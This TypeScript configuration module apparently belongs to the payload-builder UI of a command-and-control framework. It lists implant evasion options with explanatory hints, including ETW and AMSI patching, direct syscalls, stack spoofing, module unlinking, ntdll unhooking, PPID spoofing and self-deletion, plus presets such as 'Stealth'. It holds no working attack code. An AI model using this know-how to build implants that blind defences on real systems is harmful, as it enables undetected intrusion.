// OPSEC 生成期开关的唯一定义表（前端侧）。
//
// 为什么单独成文件：这些开关的值会原样进入 GenServer 请求体，再被服务端
// pkg/delivery/payload.go 按"等长替换"写进客户端二进制占位符。字段名一旦
// 漂移，表现是"UI 打开了、载荷里还是 0"，没有任何运行期症状——所以定义
// 集中在这里，组件与单测共用同一份。
//
// 判定分层（详见 docs/OPSEC.md §8 开关矩阵）：
//   - build   生成期编译进占位符，运行期只能"关"不能"开"
//   - runtime 生成期决定是否编进载荷，运行期可通过 evasion 命令热切换
//   - fixed   不给开关（正确性行为，例如镂空 W^X）

export type OpsecKey =
  | 'etwPatch'
  | 'amsiBypass'
  | 'syscallMode'
  | 'autoDelete'
  | 'sleepMaskHide'
  | 'stackSpoof'
  | 'ppidSpoof'
  | 'blockDLLs'
  | 'unhookOnStart'

export type SyscallMode = 'none' | 'direct' | 'indirect'

// OpsecForm 是面板的双向绑定模型（布尔 + 枚举 = 操作员心智模型）；
// 提交时统一转成后端认的 "1"/"0" 字符串。
export interface OpsecForm {
  etwPatch: boolean
  amsiBypass: boolean
  syscallMode: SyscallMode
  autoDelete: boolean
  sleepMaskHide: boolean
  stackSpoof: boolean
  ppidSpoof: boolean
  blockDLLs: boolean
  unhookOnStart: boolean
}

export interface OpsecCapability {
  key: OpsecKey
  kind: 'bool' | 'enum'
  labelZh: string
  labelEn: string
  hintZh?: string
  hintEn?: string
  // windows-only 能力：非 windows 载荷上强制关（linux/darwin 模板里根本没有这些代码）
  windowsOnly?: boolean
  // 仅 windows/amd64 实现（386 上是空实现，勾了也只是白勾）
  amd64Only?: boolean
  risk?: 'warn'
  // 依赖：不满足时面板禁用并说明原因
  requires?: { key: OpsecKey; values: string[]; reasonZh: string; reasonEn: string }
  layer: 'build' | 'runtime'
  group: 'evasion' | 'spawn' | 'hygiene'
}

export const OPSEC_CAPABILITIES: OpsecCapability[] = [
  {
    key: 'etwPatch',
    kind: 'bool',
    labelZh: 'ETW 补丁',
    labelEn: 'ETW patch',
    hintZh: 'patch EtwEventWrite 等 5 个导出，盲掉 ETW 用户态事件',
    hintEn: 'patches 5 EtwEventWrite* exports to blind userland ETW',
    windowsOnly: true,
    risk: 'warn',
    layer: 'runtime',
    group: 'evasion',
  },
  {
    key: 'amsiBypass',
    kind: 'bool',
    labelZh: 'AMSI 绕过',
    labelEn: 'AMSI bypass',
    hintZh: 'patch AmsiScanBuffer/AmsiScanString',
    hintEn: 'patches AmsiScanBuffer and AmsiScanString',
    windowsOnly: true,
    risk: 'warn',
    layer: 'runtime',
    group: 'evasion',
  },
  {
    key: 'syscallMode',
    kind: 'enum',
    labelZh: 'Syscall 模式',
    labelEn: 'Syscall mode',
    hintZh: 'direct = 自带 trampoline 直连内核；indirect = 经 ntdll 桩跳转',
    hintEn: 'direct = own trampolines into the kernel; indirect = jump via ntdll stub',
    windowsOnly: true,
    amd64Only: true,
    layer: 'build',
    group: 'evasion',
  },
  {
    key: 'sleepMaskHide',
    kind: 'bool',
    labelZh: '睡眠期模块摘链',
    labelEn: 'Unlink module during sleep',
    hintZh: 'sleep 窗口内把本模块从 PEB 三条链表摘掉（不动 VAD）',
    hintEn: 'unlinks self from the PEB load lists during sleep windows (VAD untouched)',
    windowsOnly: true,
    amd64Only: true,
    layer: 'runtime',
    group: 'evasion',
  },
  {
    key: 'stackSpoof',
    kind: 'bool',
    labelZh: '调用栈伪造',
    labelEn: 'Stack spoofing',
    hintZh: 'syscall 走伪栈，返回地址指向 BaseThreadInitThunk 附近',
    hintEn: 'syscalls use a synthetic stack with a BaseThreadInitThunk return address',
    windowsOnly: true,
    amd64Only: true,
    risk: 'warn',
    requires: {
      key: 'syscallMode',
      values: ['direct'],
      reasonZh: '仅 direct 模式生效：indirect 靠 ntdll 的 ret 返回，布伪栈会把返回地址暴露在模块外',
      reasonEn: 'direct only: indirect returns through ntdll, a synthetic stack would expose an out-of-module return address',
    },
    layer: 'runtime',
    group: 'evasion',
  },
  {
    key: 'unhookOnStart',
    kind: 'bool',
    labelZh: '启动即 unhook',
    labelEn: 'Unhook on start',
    hintZh: '启动时按磁盘映像恢复 ntdll/kernel32/kernelbase 的可执行节（清内联 hook）',
    hintEn: 'restores executable sections of ntdll/kernel32/kernelbase from disk at startup',
    windowsOnly: true,
    amd64Only: true,
    risk: 'warn',
    layer: 'build',
    group: 'evasion',
  },
  {
    key: 'ppidSpoof',
    kind: 'bool',
    labelZh: 'PPID 伪造',
    labelEn: 'PPID spoofing',
    hintZh: '子进程父 ID 记为 explorer.exe（仅换来进程树视图里的假父进程）',
    hintEn: 'child parent recorded as explorer.exe (process-tree view only)',
    windowsOnly: true,
    layer: 'runtime',
    group: 'spawn',
  },
  {
    key: 'blockDLLs',
    kind: 'bool',
    labelZh: 'BlockDLLs',
    labelEn: 'BlockDLLs',
    hintZh: '子进程只允许微软签名 DLL（会打坏部分 IME / Shell 扩展）',
    hintEn: 'children may only load Microsoft-signed DLLs (breaks some IMEs / shell extensions)',
    windowsOnly: true,
    risk: 'warn',
    layer: 'runtime',
    group: 'spawn',
  },
  {
    key: 'autoDelete',
    kind: 'bool',
    labelZh: '上线后自删文件',
    labelEn: 'Delete self on start',
    hintZh: '默认开：改名解锁后立即删除自身文件，进程保持在线',
    hintEn: 'on by default: unlinks the binary right after rename, process stays online',
    layer: 'build',
    group: 'hygiene',
  },
]

export const SYSCALL_MODES: { value: SyscallMode; labelZh: string; labelEn: string }[] = [
  { value: 'none', labelZh: '常规 ntdll 调用', labelEn: 'Normal (ntdll)' },
  { value: 'direct', labelZh: '直接 syscall（仅 x64）', labelEn: 'Direct syscall (x64)' },
  { value: 'indirect', labelZh: '间接 syscall（仅 x64）', labelEn: 'Indirect syscall (x64)' },
]

// DEFAULT_OPSEC_FORM 采用"服务端默认"基线：ETW/AMSI/新能力全关、syscall=none。
// autoDelete 保持开（与服务端 defs["AUTO_DELETE_PLACEHOLDER_12345"]="1" 一致），
// 避免前端默认值与后端默认值打架——两处不一致会表现成"我没勾它却自删了"。
export function defaultOpsecForm(): OpsecForm {
  return {
    etwPatch: false,
    amsiBypass: false,
    syscallMode: 'none',
    autoDelete: true,
    sleepMaskHide: false,
    stackSpoof: false,
    ppidSpoof: false,
    blockDLLs: false,
    unhookOnStart: false,
  }
}

export interface OpsecPreset {
  id: string
  labelZh: string
  labelEn: string
  descZh: string
  descEn: string
  form: OpsecForm
}

// 预设只是把常用组合一键填进去，不改变任何门控语义。
export const OPSEC_PRESETS: OpsecPreset[] = [
  {
    id: 'stealth',
    labelZh: '隐蔽优先',
    labelEn: 'Stealth',
    descZh: '全开：direct syscall + 伪栈 + 摘链 + ETW/AMSI + unhook。对 EDR 最狠，也最容易崩',
    descEn: 'everything on: direct syscall + spoof + module unlink + ETW/AMSI + unhook. Harshest, also most likely to crash',
    form: {
      etwPatch: true,
      amsiBypass: true,
      syscallMode: 'direct',
      autoDelete: true,
      sleepMaskHide: true,
      stackSpoof: true,
      ppidSpoof: true,
      blockDLLs: true,
      unhookOnStart: true,
    },
  },
  {
    id: 'balanced',
    labelZh: '平衡',
    labelEn: 'Balanced',
    descZh: '摘链 + PPID + 自删，不动 syscall/ETW/AMSI（兼容性最好，真实 EDR 下收益有限）',
    descEn: 'unlink + PPID + auto delete; leaves syscall/ETW/AMSI alone (most compatible)',
    form: {
      etwPatch: false,
      amsiBypass: false,
      syscallMode: 'none',
      autoDelete: true,
      sleepMaskHide: true,
      stackSpoof: false,
      ppidSpoof: true,
      blockDLLs: false,
      unhookOnStart: false,
    },
  },
  {
    id: 'compatible',
    labelZh: '仅兼容',
    labelEn: 'Compatible',
    descZh: '全关：不补丁、不摘链、不自删。适合排障与"先跑通再谈隐蔽"',
    descEn: 'all off: no patching, no unlink, no self delete. Use for troubleshooting',
    form: {
      etwPatch: false,
      amsiBypass: false,
      syscallMode: 'none',
      autoDelete: false,
      sleepMaskHide: false,
      stackSpoof: false,
      ppidSpoof: false,
      blockDLLs: false,
      unhookOnStart: false,
    },
  },
]

export function isWindows(osType: string): boolean {
  return String(osType || '').toLowerCase() === 'windows'
}

// normalizeForPlatform 把非 windows / 非 amd64 上不可用的项关掉（面板会同时置灰），
// 保证请求体里不会出现"勾了但载荷里没有"的开关。
export function normalizeForPlatform(form: OpsecForm, osType: string, archType = 'amd64'): OpsecForm {
  const out: OpsecForm = { ...form }
  if (!isWindows(osType)) {
    return {
      ...out,
      etwPatch: false,
      amsiBypass: false,
      syscallMode: 'none',
      sleepMaskHide: false,
      stackSpoof: false,
      ppidSpoof: false,
      blockDLLs: false,
      unhookOnStart: false,
    }
  }
  if (String(archType).toLowerCase() !== 'amd64') {
    // 386 上没有 trampoline/伪栈/摘链/unhook：只能退化成 none
    out.syscallMode = 'none'
    out.sleepMaskHide = false
    out.stackSpoof = false
    out.unhookOnStart = false
  }
  if (out.syscallMode !== 'direct') {
    // stackSpoof 只在 direct 下有意义，跟着关掉避免"勾了不生效"
    out.stackSpoof = false
  }
  return out
}

// isCapabilityEnabled 供面板渲染"是否可用 + 为什么不可用"
export function capabilityDisabledReason(
  cap: OpsecCapability,
  form: OpsecForm,
  osType: string,
  archType = 'amd64',
): 'none' | 'platform' | 'arch' | 'requires' {
  if (cap.windowsOnly && !isWindows(osType)) return 'platform'
  if (cap.amd64Only && isWindows(osType) && String(archType).toLowerCase() !== 'amd64') return 'arch'
  if (cap.requires) {
    const cur = String(form[cap.requires.key])
    if (!cap.requires.values.includes(cur)) return 'requires'
  }
  return 'none'
}

// toGenServerBody 把面板模型转成 GenServer 请求体（"1"/"0"/枚举，空串=跟随默认）。
// 只输出确定值：面板里的开关没有"未设置"状态，所以每项都显式发送，
// 保证"看到的 = 载荷里的"。
export function toGenServerBody(form: OpsecForm, osType: string, archType = 'amd64'): Record<string, string> {
  const f = normalizeForPlatform(form, osType, archType)
  const on = (v: boolean) => (v ? '1' : '0')
  return {
    etwPatch: on(f.etwPatch),
    amsiBypass: on(f.amsiBypass),
    syscallMode: f.syscallMode,
    autoDelete: on(f.autoDelete),
    sleepMaskHide: on(f.sleepMaskHide),
    stackSpoof: on(f.stackSpoof),
    ppidSpoof: on(f.ppidSpoof),
    blockDLLs: on(f.blockDLLs),
    unhookOnStart: on(f.unhookOnStart),
  }
}
